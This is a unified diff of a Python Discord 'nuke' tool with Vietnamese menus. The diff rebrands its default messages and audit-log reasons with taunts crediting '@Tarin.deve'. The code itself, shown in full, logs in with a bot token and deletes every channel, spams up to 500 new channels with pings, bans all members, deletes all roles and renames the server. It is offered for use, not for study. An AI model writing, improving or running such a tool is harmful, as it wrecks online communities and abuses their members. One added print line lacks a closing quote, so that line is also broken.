@@ -1,4 +1,4 @@
-# Dev by The Duc (Bố Solo leveling) 
+# Dev by The Duc 
 import discord
 import asyncio
 import os
@@ -6,13 +6,13 @@ import platform
 import time
 from colorama import init, Fore
 
-# === CLEAR ===
+
 def clear_once():
     os.system('cls' if platform.system() == 'Windows' else 'clear')
 
 init(autoreset=True)
 
-# === BANNER ===
+
 def show_banner():
     lines = [
         " ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ",
@@ -32,11 +32,11 @@ def show_banner():
     print(f"{Fore.CYAN}║{Fore.GREEN}{' Discord Tool by The Duc ':^58}{Fore.CYAN}║")
     print(f"{Fore.CYAN}╚{'═' * 58}╝\n")
 
-# === ASYNC INPUT ===
+# KIỂM TRA TOKEN BOT
 async def async_input(prompt=""):
     return await asyncio.get_event_loop().run_in_executor(None, input, prompt)
 
-# === GET TOKEN ASYNC ===
+
 async def get_token_async():
     while True:
         token = await async_input(f"{Fore.WHITE}Nhập Token bot: {Fore.WHITE}")
@@ -47,7 +47,7 @@ async def get_token_async():
             continue
         return token
 
-# === CẤU HÌNH BOT ===
+# CẤU HÌNH BOT
 intents = discord.Intents.default()
 intents.guilds = True
 intents.messages = True
@@ -57,7 +57,7 @@ intents.bans = True
 
 client = discord.Client(intents=intents)
 
-# === AUTO RECONNECT HANDLER ===
+# TỰ ĐỘNG CONNECT KHI MẤT KẾT NỐI
 @client.event
 async def on_disconnect():
     print(f"\n{Fore.RED}Mất kết nối với Discord... Đang thử kết nối lại...")
@@ -66,7 +66,7 @@ async def on_disconnect():
 async def on_resumed():
     print(f"{Fore.GREEN}Đã kết nối lại thành công!")
 
-# === MENU CHÍNH ===
+# MENU TOOL
 async def show_main_menu(guild):
     while True:
         clear_once()
@@ -81,6 +81,7 @@ async def show_main_menu(guild):
         print(f"{Fore.MAGENTA}5. Thực hiện nhiều chức năng")
         print(f"{Fore.RED}6. Thoát")
         print(f"{Fore.CYAN}═" * 70)
+        print(f"{Fore.CYAN}Bấm Ctrl C để thoát tool ngay lập tức khi cần)
 
         choice = await async_input(f"\n{Fore.YELLOW}Chọn (1-6): {Fore.WHITE}")
         choice = choice.strip()
@@ -100,7 +101,7 @@ async def show_main_menu(guild):
             print(f"{Fore.RED}Lựa chọn không hợp lệ!")
         await async_input(f"{Fore.YELLOW}Enter để tiếp tục...")
 
-# === ON READY ===
+
 @client.event
 async def on_ready():
     print(f"\n{Fore.GREEN}Đăng nhập thành công: {Fore.WHITE}{client.user}")
@@ -158,7 +159,7 @@ async def on_ready():
     await show_main_menu(guild)
     await client.close()
 
-# === 1. NUKE KÊNH ===
+# 1. NUKE KÊNH
 async def nuke_channels(guild):
     print(f"\n{Fore.CYAN}═" * 70)
     print(f"{Fore.MAGENTA} NUKE KÊNH")
@@ -170,7 +171,7 @@ async def nuke_channels(guild):
     deleted = 0
     for ch in guild.channels[:]:
         try:
-            await ch.delete(reason="Nuke by Discord Tool")
+            await ch.delete(reason="Nuke by @Tarin.deve")
             print(f"{Fore.GREEN}Xóa: {Fore.WHITE}{ch.name} {Fore.CYAN}({ch.type})")
             deleted += 1
             await asyncio.sleep(0.1)
@@ -178,9 +179,9 @@ async def nuke_channels(guild):
             print(f"{Fore.RED}Lỗi xóa: {ch.name} → {e}")
     print(f"{Fore.GREEN}Đã xóa {deleted} kênh.\n")
 
-    name = (await async_input(f"{Fore.YELLOW}Tên kênh mới: {Fore.WHITE}")) or "nuked"
+    name = (await async_input(f"{Fore.YELLOW}Tên kênh mới: {Fore.WHITE}")) or "Tarin on Top"
     name = name.replace(" ", "-")
-    msg = (await async_input(f"{Fore.YELLOW}Tin nhắn ping: {Fore.WHITE}")) or "Server đã bị nuke bởi Discord Tool!"
+    msg = (await async_input(f"{Fore.YELLOW}Tin nhắn ping: {Fore.WHITE}")) or "Server đã bị nuke bởi @Tarin.deve"
     try: num = int(await async_input(f"{Fore.YELLOW}Số kênh tạo (1-500): {Fore.WHITE}"))
     except: num = 10
 
@@ -198,7 +199,7 @@ async def nuke_channels(guild):
             break
     print(f"{Fore.GREEN}Đã tạo {created} kênh!")
 
-# === 2. BAN TẤT CẢ ===
+# BAN ALL MEMBERS
 async def ban_all_members(guild):
     print(f"\n{Fore.CYAN}═" * 70)
     print(f"{Fore.MAGENTA} BAN TẤT CẢ THÀNH VIÊN")
@@ -206,7 +207,7 @@ async def ban_all_members(guild):
     if (await async_input(f"{Fore.RED}Xác nhận ban tất cả? (y/n): {Fore.WHITE}")).lower() != 'y':
         return
 
-    reason = (await async_input(f"{Fore.YELLOW}Lý do ban: {Fore.WHITE}")) or "Nuke server - dọn dẹp"
+    reason = (await async_input(f"{Fore.YELLOW}Lý do ban: {Fore.WHITE}")) or "Tarin là bố của chúng mày"
     print(f"\n{Fore.YELLOW}Đang ban... (trừ chủ + bot)")
 
     banned = skipped = 0
@@ -232,7 +233,7 @@ async def ban_all_members(guild):
 
     print(f"{Fore.GREEN}Đã ban {banned}, bỏ qua {skipped}.")
 
-# === 3. XÓA ROLE ===
+# 3. XOÁ TẤT CẢ ROLE
 async def delete_all_roles(guild):
     print(f"\n{Fore.CYAN}═" * 70)
     print(f"{Fore.MAGENTA} XÓA TẤT CẢ ROLE")
@@ -247,7 +248,7 @@ async def delete_all_roles(guild):
             print(f"{Fore.CYAN}Bỏ qua: @{role.name}")
             continue
         try:
-            await role.delete(reason="Nuke - xóa role")
+            await role.delete(reason="Tarin là bố ")
             print(f"{Fore.GREEN}Xóa role: @{role.name}")
             deleted += 1
             await asyncio.sleep(0.5)
@@ -255,7 +256,7 @@ async def delete_all_roles(guild):
             print(f"{Fore.RED}Lỗi xóa: @{role.name} → {e}")
     print(f"{Fore.GREEN}Đã xóa {deleted} role.")
 
-# === 4. ĐỔI TÊN SERVER ===
+# 4. RENAME SERVER
 async def rename_server(guild):
     print(f"\n{Fore.CYAN}═" * 70)
     print(f"{Fore.MAGENTA} ĐỔI TÊN SERVER")
@@ -268,12 +269,12 @@ async def rename_server(guild):
         return
 
     try:
-        await guild.edit(name=new_name, reason="Discord Tool - đổi tên")
+        await guild.edit(name=new_name, reason="Tarin là bố")
         print(f"{Fore.GREEN}Đổi tên thành công: {new_name}")
     except Exception as e:
         print(f"{Fore.RED}Không đủ quyền hoặc lỗi: {e}")
 
-# === 5. NHIỀU CHỨC NĂNG ===
+# 5. ĐA CHỨC NĂNG
 async def custom_actions(guild):
     print(f"\n{Fore.CYAN}═" * 70)
     print(f"{Fore.MAGENTA} THỰC HIỆN NHIỀU CHỨC NĂNG")
@@ -314,7 +315,7 @@ async def custom_actions(guild):
 
     print(f"{Fore.GREEN}HOÀN TẤT TẤT CẢ!")
 
-# === CHẠY CHÍNH VỚI RECONNECT ===
+# CHẠY CHÍNH VỚI RECONNECT
 async def main():
     clear_once()
     show_banner()
@@ -341,9 +342,10 @@ async def main():
             print(f"{Fore.RED}Lỗi: {e}\n")
             await asyncio.sleep(1.5)
 
-# === CHẠY ===
+# CHẠY
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
+
         print(f"\n{Fore.RED}Đã dừng bởi người dùng.")
